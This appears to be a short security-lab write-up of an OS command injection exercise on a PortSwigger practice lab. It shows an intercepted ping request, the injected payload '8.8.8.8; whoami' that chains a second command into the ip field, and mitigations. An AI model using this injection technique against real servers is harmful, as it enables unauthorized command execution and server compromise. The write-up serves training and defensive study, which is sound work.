# OS Command Injection – Arbitrary Command Execution

## Overview

The application is vulnerable to OS Command Injection via the `ip` parameter in a network diagnostic feature. User input is passed directly to a system command without proper sanitization.

## Lab

https://portswigger.net/web-security/os-command-injection/lab-simple

## Steps to Reproduce

1. Intercept ping request:

```id="r5k2zp"
POST /ping HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

ip=8.8.8.8
```

2. Inject command separator:

```id="t8n4yc"
ip=8.8.8.8; whoami
```

3. Send request and observe response.

4. Extract command output from response body.

## Payload Used

```id="k3v9sd"
8.8.8.8; whoami
```

## Result

The response includes output of the `whoami` command, confirming command execution on the server.

## Impact

An attacker can execute arbitrary system commands, potentially leading to full server compromise.

## Tools

* Burp Suite (Proxy)
* Web Browser

## Mitigation

* Avoid passing user input to system commands
* Use safe APIs instead of shell execution
* Validate and sanitize input strictly
* Implement least privilege for application processes
